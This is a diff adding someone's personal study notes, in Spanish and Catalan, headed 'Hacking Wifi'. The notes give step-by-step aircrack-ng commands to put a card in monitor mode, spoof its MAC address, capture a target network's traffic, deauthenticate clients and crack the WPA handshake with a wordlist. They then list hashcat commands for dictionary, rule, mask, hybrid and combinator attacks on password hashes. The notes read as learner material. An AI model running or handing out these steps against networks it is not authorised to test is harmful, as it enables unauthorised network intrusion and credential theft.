@@ -1,0 +1,85 @@
+----------------------------------
+Hacking Wifi:
+
+sudo ifconfig wlan0 down
+(opcional) sudo macchanger -a wlan0
+sudo iwconfig wlan0 mode monitor
+sudo ifconfig wlan0 up
+----------------------------------
+Para capturar todas las wifis:
+
+sudo airodump-ng wlan0
+-----------------------------------
+
+Una vez sabemos la red que debemos apuntar
+
+airodump-ng -c 1 --bssid AA:FF:8A:9E:4D:6E -w dyma wlan0
+
+
+Para mandar paquetes:
+aireplay-ng -0 5 -a macXarxa -c macCliente wlan0
+
+
+para romprer la contrasenya:
+
+aircrack-ng dyma-01.cap -w "ruta del diccionario"
+---------------------------------------------------
+
+
+CREACION DE DICCIONARIOS
+
+
+
+
+
+
+
+
+-----------------------------
+CRACKING DE CONTRASENYAS:
+
+1 - Identificar el tipo de hash con este programa: hash-identifier
+
+2 - Saber que a que modo de hash pertence el dicho hash en hashcat con hashat --help | grep "tipo de hash"
+
+3 - hashcat -b Para calcular tiempo para romper el hash
+
+
+Ataques:
+------------------------------------
+diccionario a mida (QUE ES???)
+
+hashcat -a 0 -m 0 -w 4 hash.txt customlist.txt
+-------------------------------------------------
+diccionario a mida + reglas:
+
+hashcat -a 0 -m 0 -w hash.txt customlist.txt -r best64.rule --loopback (para que es el loopback??)
+----------------------------------------------------
+diccionario clasico:
+
+hashcat -a 0 -m 0 -w 4 hash.txt wordlist.txt
+----------------------------------------------------
+diccionario clasico + reglas:
+
+hashcat -a 0 -m 0 -w 4 hash.txt wordlist.txt -r best64.rule --loopback
+-----------------------------------------------------
+Atack de Màscara:
+
+hashcat -a 3 -m 0 -w 4 hash.txt rockyou-1-60.hcmask
+------------------------------------------------------
+Ataque hibrido de Mascara y Diccionario classsico:???? Porque hay dos seguidos
+
+hashcat -a 6 -m 0 -w 4 hash.txt wordlist.txt rockyou-1.60.hcmask
+hashcat -a 7 -m 0 -w 4 hash.txt rockyou-1-60.hcmask wordlist.txt
+-------------------------------------------------------------------
+Ataque de combo:
+
+hashcat -a 1 -m 0 -w 4 hash.txt wordlist.txt wordlist.txt
+
+
+
+
+
+
+
+
